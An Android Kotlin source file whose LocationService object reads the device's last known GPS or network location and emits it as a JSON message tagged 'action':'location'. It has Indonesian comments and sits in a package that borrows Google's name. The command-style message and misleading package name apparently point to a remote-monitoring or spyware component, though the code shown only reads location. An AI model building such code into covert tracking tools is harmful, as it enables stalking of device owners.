package com.google.appmods

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Looper
import androidx.core.content.ContextCompat
import org.json.JSONObject

object LocationService {
    
    fun sendLast(ctx: Context, emit: (JSONObject) -> Unit) {
        val obj = JSONObject().put("action", "location")
        
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
                    ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                
                if (loc != null) {
                    obj.put("lat", loc.latitude)
                    obj.put("lng", loc.longitude)
                    // BAGIAN INI YANG DIBENERIN (PAKE )
                    obj.put("address", "Lat: ${loc.latitude}, Lng: ${loc.longitude}")
                    obj.put("city", "-")
                } else {
                    obj.put("lat", 0.0)
                    obj.put("lng", 0.0)
                    obj.put("address", "Lokasi tidak tersedia (GPS off)")
                    obj.put("city", "-")
                }
            } else {
                obj.put("lat", 0.0)
                obj.put("lng", 0.0)
                obj.put("address", "Izin lokasi ditolak")
                obj.put("city", "-")
            }
        } catch (e: Exception) {
            obj.put("address", "Error mengambil lokasi")
        }
        
        emit(obj)
    }
}
